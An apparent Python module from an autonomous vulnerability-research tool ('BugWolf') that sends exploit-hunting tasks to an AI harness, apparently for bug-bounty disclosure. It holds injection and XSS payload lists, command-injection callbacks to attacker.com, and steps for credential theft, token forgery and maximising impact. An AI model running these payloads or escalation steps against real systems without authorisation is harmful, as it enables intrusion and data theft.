#!/usr/bin/env python3
"""BugWolf Research Thread System — self-driven research units.

A research thread is an autonomous, persistent investigation into one
threat hypothesis. It is dispatched to the harness as a "research unit"
(a self-contained task with objective, context, tools, and success criteria).
The harness executes it with full intelligence — the plugin tracks state.

Thread state machine:
  HYPOTHESIS → PROBING → SIGNAL_FOUND → ESCALATING → EXPLOITING
                                                   → VALIDATING
                                                   → EVIDENCE_PKG
                                                   → COMPLETE

  Any state → REFUTED (definitively not vulnerable)
  Any state → BLOCKED (needs operator decision)
  Any state → DOCUMENTED_LIMITED (found but impact limited)

The plugin NEVER tells the harness how to do research. It tells the harness
WHAT to research, provides TOOLS, and tracks PROGRESS. The harness is the
researcher.

Usage:
  python3 tools/research_thread.py --target T --generate-threats --json
  python3 tools/research_thread.py --target T --spawn-threads --json
  python3 tools/research_thread.py --target T --advance-asset --status --json
"""

from __future__ import annotations

import hashlib
import json
import re
import sys
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional

try:
    from tools.runtime_paths import target_slug, workspace_root
except ImportError:  # direct script execution
    from runtime_paths import target_slug, workspace_root

from tools.campaign import (
    CampaignManager, ThreadRecord, ThreadState, ThreatHypothesis,
    AssetRecord, AssetStatus, Priority,
)
from tools.asset_discovery import build_research_unit

SCHEMA = "bugwolf-research-thread-v1"


# ---------------------------------------------------------------------------
# Elicitation gap bridge (U2): resolve deterministic artifacts into unit context
# ---------------------------------------------------------------------------

# Deterministic artifact families per stage, mirroring the stage controller's
# supplementary-artifact catalog.  Keys are stable category labels; values are
# (relative-path pattern) pairs.  Patterns use ``{target}`` for the target slug
# and ``*`` for a stack/host suffix.
DETERMINISTIC_ARTIFACT_PATTERNS: Dict[str, List[str]] = {
    "waf_payloads": [
        "research/{target}/bypass/waf-payloads-*.json",
    ],
    "smuggling_plan": [
        "recon/{target}/discovery/smuggling-plan.jsonl",
    ],
    "jwt_plans": [
        "research/{target}/auth/jwt-forgery-plans.json",
    ],
    "oauth_plans": [
        "research/{target}/auth/oauth-flow-plans.json",
    ],
    "graphql_plans": [
        "recon/{target}/discovery/graphql-plans.json",
    ],
    "bopla_matrix": [
        "recon/{target}/discovery/bopla-matrix.json",
    ],
    "ato_plans": [
        "recon/{target}/discovery/ato-chain-plans.json",
    ],
    "contract_plans": [
        "research/{target}/contracts/triage-verdicts.json",
        "research/{target}/contracts/price-manipulation-plans.json",
    ],
    "llm_plans": [
        "research/{target}/llm/agentic-tool-auth-plans.json",
        "research/{target}/llm/rag-poisoning-plans.json",
    ],
    "advisor_proposals": [
        "research/{target}/advisor/seed-proposals.json",
    ],
    "deep_link_plans": [
        "recon/{target}/discovery/deep-link-plans.json",
    ],
    "mobile_policy": [
        "recon/{target}/discovery/mobile-policy-check.json",
    ],
    "iam_privesc": [
        "state/capability/iam-privesc-{target}.json",
    ],
    "learning_bypass": [
        "research/{target}/learning/failure-bypass-candidates.json",
    ],
}


def resolve_deterministic_artifacts(
    target: str, *, project_root: Optional[str] = None,
    base_dir: Optional[str] = None, bug_class: str = "",
) -> Dict[str, Any]:
    """Resolve existing deterministic artifacts into a unit context block.

    Returns ``{"artifact_paths": [...], "deterministic_evidence": {...}}``
    with only artifacts that actually exist (empty list when none do).  This
    is the bridge between the harness's free-text ``suggested_approaches``
    (LLM intent) and the deterministic payload/probe artifacts (execution
    details) produced by the domain tools.

    ``bug_class`` narrows the evidence block to the relevant families
    (e.g. ``sqli`` keeps ``waf_payloads`` + ``smuggling_plan``).
    """
    if base_dir:
        root = Path(base_dir)
    else:
        root = workspace_root(project_root)
    slug = target_slug(target)
    evidence: Dict[str, List[str]] = {}
    for category, patterns in DETERMINISTIC_ARTIFACT_PATTERNS.items():
        hits: List[str] = []
        for pattern in patterns:
            rel = pattern.format(target=slug)
            for path in sorted(root.glob(rel)):
                try:
                    rel_path = str(path.relative_to(root))
                except ValueError:
                    rel_path = str(path)
                hits.append(rel_path)
        if hits:
            evidence[category] = hits
    flat = sorted(path for paths in evidence.values() for path in paths)
    return {
        "artifact_paths": flat,
        "deterministic_evidence": evidence,
        "bug_class_filter": bug_class or "all",
    }


def attach_deterministic_artifacts(
    unit: Dict[str, Any], target: str, *,
    project_root: Optional[str] = None, base_dir: Optional[str] = None,
    bug_class: str = "",
) -> Dict[str, Any]:
    """Merge resolved artifact paths into ``unit["context"]`` (advisory).

    The unit's dispatch format is untouched; the artifacts are pure context
    the harness may use to ground its execution in deterministic payloads.
    """
    if not isinstance(unit, dict):
        return unit
    context = unit.setdefault("context", {})
    if not isinstance(context, dict):
        context = {}
        unit["context"] = context
    resolved = resolve_deterministic_artifacts(
        target, project_root=project_root, base_dir=base_dir,
        bug_class=bug_class)
    context["deterministic_evidence"] = resolved["deterministic_evidence"]
    context["artifact_paths"] = resolved["artifact_paths"]
    context["bug_class_filter"] = resolved["bug_class_filter"]
    return unit

# ---------------------------------------------------------------------------
# Threat model templates — what threats exist for each asset type
# ---------------------------------------------------------------------------

THREAT_TEMPLATES: Dict[str, List[Dict[str, Any]]] = {
    "web_api": [
        {"type": "sql_injection", "confidence": "high",
         "rationale": "API endpoints accepting query parameters are prime SQLi targets",
         "approach": "Test every query parameter for injection: single-quote, time-based blind, boolean blind, UNION SELECT"},
        {"type": "idor", "confidence": "high",
         "rationale": "APIs expose resource IDs in URLs and request bodies",
         "approach": "Two-account test: Account A creates resource, Account B attempts access"},
        {"type": "auth_bypass", "confidence": "high",
         "rationale": "Every API endpoint is an auth boundary",
         "approach": "Test without auth header, with expired token, with wrong-role token, with forged claims"},
        {"type": "rate_limiting", "confidence": "medium",
         "rationale": "APIs without rate limiting enable brute force and enumeration",
         "approach": "Send rapid requests, observe for 429 responses or missing rate-limit headers"},
        {"type": "mass_assignment", "confidence": "high",
         "rationale": "POST/PUT/PATCH endpoints may accept privileged fields",
         "approach": "Add role, is_admin, balance fields to request bodies"},
        {"type": "parameter_pollution", "confidence": "medium",
         "rationale": "Frameworks handle duplicate parameters differently",
         "approach": "Send duplicate parameters, observe which value the server uses"},
        {"type": "ssrf", "confidence": "medium",
         "rationale": "Any parameter accepting a URL is a potential SSRF",
         "approach": "Test URL parameters: internal IPs, cloud metadata, protocol switching"},
    ],
    "web_app": [
        {"type": "xss", "confidence": "high",
         "rationale": "Any reflected user input is a potential XSS vector",
         "approach": "Test HTML context, attribute context, JS context, CSS context"},
        {"type": "csrf", "confidence": "high",
         "rationale": "State-changing operations without CSRF tokens are vulnerable",
         "approach": "Submit form without CSRF token, check if action succeeds"},
        {"type": "open_redirect", "confidence": "high",
         "rationale": "Login flows, OAuth callbacks, and exit pages often redirect",
         "approach": "Test redirect parameters: //evil.com, https://evil.com, javascript:alert(1)"},
        {"type": "clickjacking", "confidence": "medium",
         "rationale": "Pages without X-Frame-Options can be framed",
         "approach": "Check for X-Frame-Options header, frame the page, test click targets"},
    ],
    "oauth_idp": [
        {"type": "oauth_misconfig", "confidence": "critical",
         "rationale": "OAuth flows have many misconfiguration points",
         "approach": "Test redirect_uri validation, state parameter, PKCE, client_secret exposure"},
        {"type": "jwt_attack", "confidence": "critical",
         "rationale": "JWT implementations often have weak secrets or algorithm confusion",
         "approach": "Test alg:none, weak HMAC secrets, RS256→HS256 confusion, kid injection"},
        {"type": "session_fixation", "confidence": "medium",
         "rationale": "Session tokens that don't rotate on login are vulnerable",
         "approach": "Capture pre-login session, login, test if old session still works"},
        {"type": "account_takeover", "confidence": "high",
         "rationale": "Password reset, email change, and MFA bypass are ATO vectors",
         "approach": "Test reset token predictability, email change without verification, MFA bypass"},
    ],
    "admin_panel": [
        {"type": "auth_bypass", "confidence": "critical",
         "rationale": "Admin panels are the highest-value auth bypass targets",
         "approach": "Test direct access without session, header forgery, role escalation"},
        {"type": "idor", "confidence": "critical",
         "rationale": "Admin endpoints often have weaker object-level authorization",
         "approach": "Access admin endpoints with user-level session, modify other users' data"},
        {"type": "command_injection", "confidence": "high",
         "rationale": "Admin panels often have system operations (backup, export, diagnostics)",
         "approach": "Test file export names, system command fields, import functionality"},
        {"type": "file_upload", "confidence": "high",
         "rationale": "Admin file upload is a direct path to RCE",
         "approach": "Upload webshell variants, test extension bypass, content-type spoofing"},
    ],
    "graphql": [
        {"type": "graphql_introspection", "confidence": "critical",
         "rationale": "Introspection exposes the entire API schema",
         "approach": "Send introspection query, check if schema is returned"},
        {"type": "graphql_idor", "confidence": "critical",
         "rationale": "GraphQL node(id:) resolvers often miss per-object auth",
         "approach": "Test global ID replay across accounts, batch queries, field-level auth"},
        {"type": "graphql_dos", "confidence": "high",
         "rationale": "Deeply nested queries can cause denial of service",
         "approach": "Craft recursive/nested queries, measure response time and memory usage"},
        {"type": "graphql_injection", "confidence": "high",
         "rationale": "GraphQL arguments reach backend databases and services",
         "approach": "Test query arguments for SQLi, NoSQLi, command injection via resolvers"},
    ],
    "ci_cd": [
        {"type": "workflow_injection", "confidence": "critical",
         "rationale": "CI/CD pipelines execute attacker-controlled code from PRs",
         "approach": "Test expression injection in workflow files, untrusted checkout, artifact poisoning"},
        {"type": "secret_exposure", "confidence": "critical",
         "rationale": "CI/CD logs and artifacts often leak secrets",
         "approach": "Check build logs for env var dumps, secret references, token exposures"},
    ],
}

# ---------------------------------------------------------------------------
# Fallback threat templates — every asset type must spawn research threads.
# ---------------------------------------------------------------------------

_FALLBACK_BASE = [
    {"type": "auth_bypass", "confidence": "high",
     "rationale": "Every exposed service is an authentication boundary",
     "approach": "Test without credentials, with weak/forged credentials, and with role confusion"},
    {"type": "idor", "confidence": "high",
     "rationale": "Object-level authorization is often missing on secondary services",
     "approach": "Two-account test plus ID enumeration on every resource-bearing endpoint"},
    {"type": "information_disclosure", "confidence": "medium",
     "rationale": "Secondary services frequently leak internal state, versions, or credentials",
     "approach": "Probe verbose errors, directory listing, backup files, and debug endpoints"},
    {"type": "misconfiguration", "confidence": "medium",
     "rationale": "Non-web services are rarely hardened against default/misconfigured states",
     "approach": "Check default credentials, insecure defaults, and exposed management interfaces"},
]

_FALLBACK_PER_TYPE: Dict[str, List[Dict[str, Any]]] = {
    "storage_bucket": [{"type": "public_bucket_access", "confidence": "high",
        "rationale": "Cloud storage is frequently world-readable or world-writable",
        "approach": "Test anonymous list/get/put, ACL misconfig, and object enumeration"}],
    "database": [{"type": "sql_injection", "confidence": "high",
        "rationale": "Directly exposed databases accept injection through query parameters",
        "approach": "Test query params and connection strings for SQLi; check for exposed admin interfaces"}],
    "websocket": [{"type": "injection", "confidence": "high",
        "rationale": "WebSocket message payloads often bypass HTTP-layer filters",
        "approach": "Fuzz message content for injection; test origin validation and cross-site hijacking"}],
    "mobile_api": [{"type": "api_auth_bypass", "confidence": "high",
        "rationale": "Mobile backends often trust device-supplied identity",
        "approach": "Test client-side auth decisions, missing cert pinning, and endpoint impersonation"}],
    "cdn": [{"type": "cache_poisoning", "confidence": "medium",
        "rationale": "CDN edge caches are prime cache-key confusion targets",
        "approach": "Test cache-key manipulation, origin override headers, and purge behavior"}],
    "dns_server": [{"type": "dns_misconfig", "confidence": "medium",
        "rationale": "Misconfigured DNS can enable takeover or spoofing",
        "approach": "Check zone transfer, open recursion, and dangling NS/glue records"}],
    "email_server": [{"type": "email_spoofing", "confidence": "medium",
        "rationale": "Mail servers without strict SPF/DKIM/DMARC allow spoofing",
        "approach": "Check SPF/DKIM/DMARC posture and open-relay behavior"}],
    "internal_tool": [{"type": "auth_bypass", "confidence": "critical",
        "rationale": "Internal tools assume network trust and skip proper auth",
        "approach": "Test direct access, default creds, and header-based auth bypass"}],
    "smart_contract": [{"type": "economic_invariant_break", "confidence": "medium",
        "rationale": "Contract value lives in invariants (solvency/supply/permission/price)",
        "approach": "Map invariants first, then mutate the controlled variable that breaks one"}],
    "binary_service": [{"type": "memory_corruption", "confidence": "low",
        "rationale": "Binary services may expose parser bugs reachable from the network",
        "approach": "Fuzz input parsing; check for crashes, ASLR/NX posture, and unsafe deserialization"}],
    "container_registry": [{"type": "registry_misconfig", "confidence": "high",
        "rationale": "Registries often allow anonymous pull or push",
        "approach": "Test anonymous pull/push, tag overwrite, and exposed credentials in images"}],
    "iot_endpoint": [{"type": "iot_default_creds", "confidence": "high",
        "rationale": "IoT endpoints ship with default credentials and no rate limiting",
        "approach": "Test default creds, unauthenticated firmware/config access, and exposed debug ports"}],
    "source_repo": [{"type": "secret_exposure", "confidence": "high",
        "rationale": "Repositories leak credentials and internal hostnames",
        "approach": "Search history and files for secrets, .env, configs, and internal references"}],
}


def _fallback_threats(asset_type: str) -> List[Dict[str, Any]]:
    """Type-aware generic threat templates so no asset type is left threadless."""
    per_type = _FALLBACK_PER_TYPE.get(asset_type, [])
    used = {t["type"] for t in per_type}
    generic = [t for t in _FALLBACK_BASE if t["type"] not in used]
    return per_type + generic


# Bug class → escalation techniques (what to try after confirming the vuln)
ESCALATION_TECHNIQUES: Dict[str, List[str]] = {
    "sql_injection": [
        "Extract database version and user",
        "Enumerate database schema (tables, columns)",
        "Extract sensitive table contents (users, sessions, payments)",
        "Test for file read/write (LOAD_FILE, INTO OUTFILE)",
        "Test for command execution (xp_cmdshell, UDF)",
    ],
    "idor": [
        "Enumerate resource IDs sequentially",
        "Test write operations on other users' resources",
        "Test delete operations on other users' resources",
        "Chain with mass assignment to escalate privileges",
    ],
    "xss": [
        "Test session cookie theft (if HttpOnly not set)",
        "Test keylogging / form hijacking",
        "Test CSRF token extraction for chained attacks",
        "Test DOM modification for defacement/phishing",
    ],
    "ssrf": [
        "Probe internal network (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)",
        "Access cloud metadata (169.254.169.254)",
        "Test protocol smuggling (gopher://, dict://)",
        "Chain with internal service exploitation",
    ],
    "auth_bypass": [
        "Access admin-only endpoints with bypassed auth",
        "Modify other users' data without authorization",
        "Extract all user data from authenticated endpoints",
        "Escalate to full account takeover",
    ],
    "command_injection": [
        "Document what a reverse shell connection would look like (NOT executed)",
        "Document what sensitive file reads would reveal (NOT executed)",
        "Document what internal-network pivot would entail (NOT executed)",
        "Document what persistence (cron, SSH key, backdoor) would consist of (NOT executed)",
    ],
    "jwt_attack": [
        "Forge admin-role JWT tokens",
        "Access admin endpoints with forged token",
        "Modify other users' resources using admin privileges",
        "Extract full user database with admin access",
    ],
    "path_traversal": [
        "Read source code files for further analysis",
        "Read configuration files (database credentials, API keys)",
        "Read SSH keys, AWS credentials, environment files",
        "Write webshell via log file poisoning if write is possible",
    ],
}


# ---------------------------------------------------------------------------
# Thread Builder
# ---------------------------------------------------------------------------

# pass@k (U4): diverse system-prompt families cycled across variant threads.
# Deterministic and bounded; each variant attacks the same threat from a
# different angle so the best pass wins without changing what the core
# considers valid.
PASS_SYSTEM_PROMPTS: tuple = (
    "You are BugWolf's primary researcher: be thorough and skeptical; "
    "confirm with reproducible evidence before escalating.",
    "You are BugWolf's variant analyst: attack from a different angle; "
    "prefer differential and baseline comparisons over payload volume.",
    "You are BugWolf's escalation specialist: once a signal appears, "
    "maximize impact systematically and record every step.",
)


class ThreadBuilder:
    """Build research threads from threats and dispatch them to the harness."""

    def __init__(self, target: str, *, pass_at_k: int = 1):
        self.target = target_slug(target)
        self.campaign = CampaignManager(target)
        self.pass_at_k = max(1, int(pass_at_k or 1))

    # -- Threat generation from asset type templates -----------------------

    def generate_threats(self, asset: AssetRecord) -> List[ThreatHypothesis]:
        """Generate threat hypotheses for an asset based on its type and templates.

        Asset types without a dedicated template use the type-aware fallback
        generator so every asset spawns research threads.  Threats target the
        recon-discovered endpoints (never just the bare hostname).
        """
        templates = THREAT_TEMPLATES.get(asset.type.value)
        if templates is None:
            templates = _fallback_threats(asset.type.value)
        endpoints = list(asset.endpoints or [asset.hostname])
        threats = []
        for tmpl in templates:
            threat = ThreatHypothesis(
                threat_id=hashlib.sha256(
                    f"{asset.asset_id}:{tmpl['type']}".encode()
                ).hexdigest()[:12],
                type=tmpl["type"],
                confidence=tmpl["confidence"],
                rationale=f"{tmpl['rationale']} (on {asset.hostname})",
                target_endpoints=list(endpoints),
                research_plan=tmpl["approach"],
            )
            threats.append(threat)
        return threats

    def build_threads_for_asset(self, asset: AssetRecord, *,
                                pass_at_k: Optional[int] = None) -> List[ThreadRecord]:
        """Generate threats and spawn research threads for an asset.

        With ``pass_at_k`` > 1, every threat spawns ``k`` variant threads
        (pass_variant 0..k-1) that share a ``pass_group`` and attack the same
        hypothesis from different system-prompt angles — the test-time
        compute scaling of U4.  Deduplication is per (bug_class, variant) so
        a second deep-dive pass adds variants without re-spawning the
        primary threads.
        """
        pass_at_k = max(1, int(pass_at_k or self.pass_at_k))
        threats = self.generate_threats(asset)

        # Check for existing threads to avoid duplicates (variant-aware).
        existing = {
            (t.bug_class, t.pass_variant)
            for t in self.campaign.list_threads(asset_id=asset.asset_id)
        }

        threads = []
        for threat in threats:
            for variant in range(pass_at_k):
                if (threat.type, variant) in existing:
                    continue
                thread = self.campaign.spawn_thread(
                    asset, threat, pass_variant=variant,
                    pass_group=threat.type)
                threads.append(thread)

        # Save threats to asset
        self.campaign.save_threats(asset.asset_id, threats)

        # Update asset status
        asset.threats_identified = len(threats)
        asset.threats_resolved = 0
        self.campaign.update_asset(asset)

        return threads

    # -- Research unit dispatch --------------------------------------------

    def get_next_research_unit(self, thread: ThreadRecord) -> Dict[str, Any]:
        """Build the next research unit for a thread that the harness will execute.

        This is THE core dispatch. The harness receives this unit and executes
        it with full intelligence. The unit contains WHAT to do, not HOW.
        """
        context = {
            "thread_id": thread.thread_id,
            "asset": "",
            "current_state": thread.state.value,
            "what_we_know": thread.confirmed_behavior or "Nothing confirmed yet. We are beginning research.",
            "what_we_need": self._what_we_need(thread),
            "history": thread.observations[-5:] if thread.observations else [],
            "blocker": thread.current_blocker or "",
        }

        # Get the asset for context
        asset = self.campaign.get_asset(thread.asset_id)
        if asset:
            context["asset"] = asset.hostname
            context["asset_type"] = asset.type.value

        # Build objective based on current state
        objective = self._objective_for_state(thread)

        # Build success criteria based on state
        criteria = self._criteria_for_state(thread)

        # Build suggested approaches based on state + bug class
        approaches = self._approaches_for_state(thread)

        # pass@k (U4): label the variant and diversify the approaches so each
        # pass explores different ground.  Deterministic rotation.
        variant = max(0, int(getattr(thread, "pass_variant", 0) or 0))
        if variant and approaches:
            rotated = approaches[variant % len(approaches):] \
                + approaches[:variant % len(approaches)]
            approaches = rotated

        unit = build_research_unit(
            objective=objective,
            asset_hostname=context.get("asset", ""),
            bug_class=thread.bug_class,
            endpoint=thread.endpoint,
            context=context,
            success_criteria=criteria,
            max_iterations=min(50, thread.max_iterations - thread.iterations),
            variant=variant,
            pass_index=variant,
            system_prompt=PASS_SYSTEM_PROMPTS[
                variant % len(PASS_SYSTEM_PROMPTS)],
        )
        if approaches:
            unit["suggested_approaches"] = approaches
        # Elicitation bridge (U2): ground the free-text approaches in the
        # deterministic artifacts (payload families, probe plans, forgery
        # plans) that already exist for this target.
        attach_deterministic_artifacts(
            unit, self.target,
            project_root=str(workspace_root()),
            bug_class=thread.bug_class)
        # Model routing (U5): advisory model_preference for the harness.
        try:
            from tools.core.model_router import attach_hint
            attach_hint(unit)
            routing = (unit.get("context") or {}).get("model_routing") or {}
            if routing:
                self.campaign.log_event("unit_routed", {
                    "unit_id": thread.thread_id,
                    "model_tier": routing.get("tier"),
                    "model_preference": routing.get("model_preference"),
                    "complexity": routing.get("complexity"),
                })
        except Exception:
            pass  # routing is advisory, never a dispatch gate

        return unit

    def _objective_for_state(self, thread: ThreadRecord) -> str:
        if thread.state == ThreadState.HYPOTHESIS:
            return (f"Confirm or refute {thread.bug_class} vulnerability "
                    f"on {thread.endpoint or 'the target'}")
        if thread.state == ThreadState.PROBING:
            return (f"Probe {thread.bug_class} on {thread.endpoint}. "
                    f"Send test payloads and observe responses.")
        if thread.state == ThreadState.SIGNAL_FOUND:
            return (f"Escalate confirmed {thread.bug_class} to maximum impact. "
                    f"{thread.confirmed_behavior}")
        if thread.state == ThreadState.ESCALATING:
            return (f"Continue escalating {thread.bug_class}. "
                    f"Apply escalation techniques for this bug class.")
        if thread.state == ThreadState.EXPLOITING:
            return (f"Build working exploit for {thread.bug_class}. "
                    f"Generate actual payload, not a template.")
        if thread.state == ThreadState.VALIDATING:
            return (f"Validate the exploit for {thread.bug_class}. "
                    f"Confirm it works reliably and measure impact.")
        if thread.state == ThreadState.EVIDENCE_PKG:
            return (f"Package evidence for {thread.bug_class} finding. "
                    f"Record reproduction steps, impact, and exploit artifacts.")
        return f"Research {thread.bug_class} on {thread.endpoint}"

    def _criteria_for_state(self, thread: ThreadRecord) -> List[str]:
        if thread.state == ThreadState.HYPOTHESIS:
            return [
                "Send at least one probe that would trigger the vulnerability if it exists",
                "Observe whether the response indicates vulnerability or normal behavior",
                "Report conclusion: SIGNAL (vulnerable behavior observed) or REFUTED (definitively not)",
            ]
        if thread.state == ThreadState.PROBING:
            return [
                "Confirm the vulnerability with at least 2 different detection methods",
                "Eliminate false positives (baseline comparison, control test)",
                "Report whether the vulnerability is CONFIRMED or REFUTED",
            ]
        if thread.state == ThreadState.SIGNAL_FOUND:
            return [
                "Increase impact: extract data, access other resources, escalate privileges",
                "Document what was achieved at each escalation step",
                "Report FULL_IMPACT when maximum impact is reached, or BLOCKED if stuck",
            ]
        if thread.state in (ThreadState.EXPLOITING, ThreadState.VALIDATING, ThreadState.EVIDENCE_PKG):
            return [
                "Produce a working exploit (not a template — actual working payload)",
                "Validate the exploit works reliably",
                "Record all evidence: reproduction steps, impact, exploit code",
                "Write everything to the evidence store",
            ]
        return [
            "Make progress on the thread objective",
            "Report findings, observations, or blockers",
        ]

    def _approaches_for_state(self, thread: ThreadRecord) -> List[str]:
        """Generate suggested approaches based on the thread's state and bug class."""
        approaches = []
        if thread.state in (ThreadState.HYPOTHESIS, ThreadState.PROBING):
            approaches = ThreadBuilder._detection_approaches(thread.bug_class)
        elif thread.state in (ThreadState.SIGNAL_FOUND, ThreadState.ESCALATING):
            approaches = ESCALATION_TECHNIQUES.get(thread.bug_class, [])
        elif thread.state in (ThreadState.EXPLOITING, ThreadState.VALIDATING):
            approaches = [
                f"Write exploit code for {thread.bug_class}",
                "Test exploit against the target",
                "Confirm impact and record evidence",
            ]

        # Add thread-specific context
        if thread.current_blocker:
            approaches.insert(0, f"BLOCKER: {thread.current_blocker} — find bypass or workaround")
        if thread.suggested_approaches:
            approaches = thread.suggested_approaches + approaches

        return approaches[:15]

    @staticmethod
    def _detection_approaches(bug_class: str) -> List[str]:
        return {
            "sql_injection": [
                "Send single-quote: ' — observe for SQL error messages",
                "Time-based blind: ' AND SLEEP(5)-- — compare response time to baseline",
                "Boolean-based blind: ' AND 1=1-- vs ' AND 1=2-- — compare responses",
                "Error-based: Send type mismatch to trigger informative errors",
                "Stacked queries: '; SELECT 1-- — test if multiple statements execute",
                "Out-of-band: '; EXEC xp_dirtree '//attacker.com/a'-- — DNS callback test",
            ],
            "idor": [
                "Create resource as Account A. Record the resource ID.",
                "Access Account A's resource as Account B (different session).",
                "If accessible, escalate: attempt PUT/PATCH/DELETE on A's resource as B.",
                "Test sequential ID enumeration (increment/decrement known IDs).",
                "Test alternate ID formats (UUID, encoded, hashed).",
            ],
            "xss": [
                "Inject <script>alert(document.domain)</script> — test HTML context",
                "Inject \"><script>alert(1)</script> — break out of attribute context",
                "Inject '-alert(1)-' — test JavaScript string context",
                "Inject <img src=x onerror=alert(1)> — event handler bypass",
                "Inject <svg/onload=alert(1)> — SVG context bypass",
                "Use headless browser to verify alert actually fires",
            ],
            "ssrf": [
                "Replace URL parameter with a description of the internal host (NOT a literal payload) — confirm with operator before sending",
                "Test cloud metadata reachability via the operator-approved IMDS probe only",
                "Test internal services via operator-approved scope entries only",
                "Document protocol-switching hypotheses; do not embed literal file:// or gopher:// URLs",
                "Test DNS rebinding: use a domain that the operator has authorized in the scope file",
            ],
            "auth_bypass": [
                "Request endpoint without any authentication header",
                "Request with expired/invalid JWT token",
                "Request with user-role JWT against admin endpoint",
                "Test HTTP method override: POST→GET, check if auth is skipped",
                "Test header injection: X-Original-URL, X-Rewrite-URL to bypass auth middleware",
                "Test JWT algorithm confusion: change alg to 'none', forge token",
            ],
            "command_injection": [
                "Inject command separator: ; id",
                "Inject pipe: | id",
                "Inject subshell: $(id) or `id`",
                "Inject AND/OR: && id, || id",
                "Blind injection: ; sleep 5 — compare response time",
                "Out-of-band: ; curl http://attacker.com/$(whoami) — callback test",
            ],
        }.get(bug_class, [
            "Research standard detection techniques for this bug class",
            "Send minimal test payload and observe response",
            "Compare candidate response against baseline/control response",
            "If signal detected, escalate impact systematically",
            "If nothing detected, try alternative techniques before refuting",
        ])

    @staticmethod
    def _what_we_need(thread: ThreadRecord) -> str:
        if thread.state == ThreadState.HYPOTHESIS:
            return "Initial confirmation: does the vulnerability exist?"
        if thread.state == ThreadState.PROBING:
            return "Verification: eliminate false positives, confirm with multiple methods"
        if thread.state == ThreadState.SIGNAL_FOUND:
            return "Escalation: increase impact from detection to data extraction or code execution"
        if thread.state == ThreadState.ESCALATING:
            return "Maximum impact: reach the highest-impact outcome for this bug class"
        if thread.state == ThreadState.EXPLOITING:
            return "Working exploit: produce actual payload, not template"
        if thread.state == ThreadState.VALIDATING:
            return "Verification: confirm exploit works reliably, measure exact impact"
        if thread.state == ThreadState.EVIDENCE_PKG:
            return "Documentation: record everything for disclosure"
        return "Progress: advance the thread to the next state"

    # -- Thread state management -------------------------------------------

    def transition_thread(self, thread: ThreadRecord,
                          new_state: ThreadState | str,
                          *, observation: str = "",
                          conclusion: str = "") -> ThreadRecord:
        """Transition a thread to a new state with observation recording."""
        if isinstance(new_state, str):
            new_state = ThreadState(new_state)

        # Record the observation
        step = len(thread.observations) + 1
        action = f"Transitioned from {thread.state.value} to {new_state.value}"
        thread.record_observation(step, action, observation, conclusion)

        # Update state
        thread.state = new_state
        self.campaign.save_thread(thread)

        # If completed, update asset stats
        if new_state == ThreadState.COMPLETE:
            self._on_thread_complete(thread)
        elif new_state == ThreadState.REFUTED:
            self._on_thread_refuted(thread)

        return thread

    def record_observation(self, thread: ThreadRecord, *,
                           action: str, observation: str,
                           conclusion: str) -> ThreadRecord:
        """Record an observation without changing state."""
        step = len(thread.observations) + 1
        thread.record_observation(step, action, observation, conclusion)
        self.campaign.save_thread(thread)
        return thread

    def set_blocker(self, thread: ThreadRecord,
                    blocker: str) -> ThreadRecord:
        """Set a blocker on a thread and transition to BLOCKED state."""
        thread.current_blocker = blocker
        return self.transition_thread(
            thread, ThreadState.BLOCKED,
            observation=blocker,
            conclusion="Research blocked — needs operator input",
        )

    def update_progress(self, thread: ThreadRecord, *,
                        confirmed_behavior: str = "",
                        last_successful_action: str = "",
                        suggested_approaches: Optional[List[str]] = None,
                        endpoint: str = "") -> ThreadRecord:
        """Update thread progress fields without changing state."""
        if confirmed_behavior:
            thread.confirmed_behavior = confirmed_behavior
        if last_successful_action:
            thread.last_successful_action = last_successful_action
        if suggested_approaches:
            thread.suggested_approaches = suggested_approaches
        if endpoint:
            thread.endpoint = endpoint
        self.campaign.save_thread(thread)
        return thread

    # -- Thread completion handling ----------------------------------------

    def _on_thread_complete(self, thread: ThreadRecord) -> None:
        """Handle thread completion: update asset and campaign stats."""
        asset = self.campaign.get_asset(thread.asset_id)
        if asset:
            asset.threats_resolved += 1
            asset.findings += 1
            self.campaign.update_asset(asset)

        state = self.campaign.load()
        state.total_findings += 1
        state.zero_day_candidates += 1  # will be refined by novelty assessor
        self.campaign.save(state)

    def _on_thread_refuted(self, thread: ThreadRecord) -> None:
        """Handle thread refutation: update asset stats."""
        asset = self.campaign.get_asset(thread.asset_id)
        if asset:
            asset.threats_resolved += 1
            self.campaign.update_asset(asset)

    # -- Asset lifecycle ---------------------------------------------------

    def start_asset_research(self, asset: AssetRecord, *,
                             pass_at_k: Optional[int] = None) -> List[ThreadRecord]:
        """Begin the deep research phase for an asset."""
        pass_at_k = max(1, int(pass_at_k or self.pass_at_k))
        threads = self.build_threads_for_asset(asset, pass_at_k=pass_at_k)

        # Ensure we don't go over the concurrent thread limit: cap the total
        # so the highest-priority threats keep their full variant sets.
        state = self.campaign.load()
        max_threads = state.max_concurrent_threads
        if len(threads) > max_threads * pass_at_k:
            # Prioritize: spawn only the highest-priority ones first
            threads = threads[:max_threads * pass_at_k]

        asset.status = AssetStatus.DEEP_RESEARCH
        if not asset.started_at:
            asset.started_at = datetime.now(timezone.utc).isoformat()
        self.campaign.update_asset(asset)
        return threads

    def check_asset_exhausted(self, asset: AssetRecord) -> bool:
        """Check if an asset is fully exhausted."""
        threats = self.campaign.list_threads(asset_id=asset.asset_id)
        if not threats:
            return False

        total = len(threats)
        resolved = sum(1 for t in threats
                       if t.state in {ThreadState.COMPLETE, ThreadState.REFUTED,
                                     ThreadState.DOCUMENTED_LIMITED})
        return resolved >= total

    def next_action(self, asset: AssetRecord) -> Dict[str, Any]:
        """Determine the next action for an asset."""
        # Check for blocked threads that need operator input
        blocked = self.campaign.list_threads(
            asset_id=asset.asset_id, state=ThreadState.BLOCKED)
        if blocked:
            return {
                "action": "operator_input_needed",
                "blocked_threads": [
                    {"id": t.thread_id, "blocker": t.current_blocker}
                    for t in blocked
                ],
            }

        # Check for active threads that need more work
        active = [t for t in self.campaign.list_threads(asset_id=asset.asset_id)
                  if not t.is_terminal]
        if active:
            # Return the highest-priority active thread that can be worked on
            return {
                "action": "continue_thread",
                "thread_id": active[0].thread_id,
                "thread_state": active[0].state.value,
            }

        # Check if asset is exhausted
        if self.check_asset_exhausted(asset):
            return {"action": "asset_exhausted"}

        # Shouldn't happen, but spawn more threads if needed
        return {"action": "spawn_threads"}

    def advance_asset(self, asset: AssetRecord) -> AssetRecord:
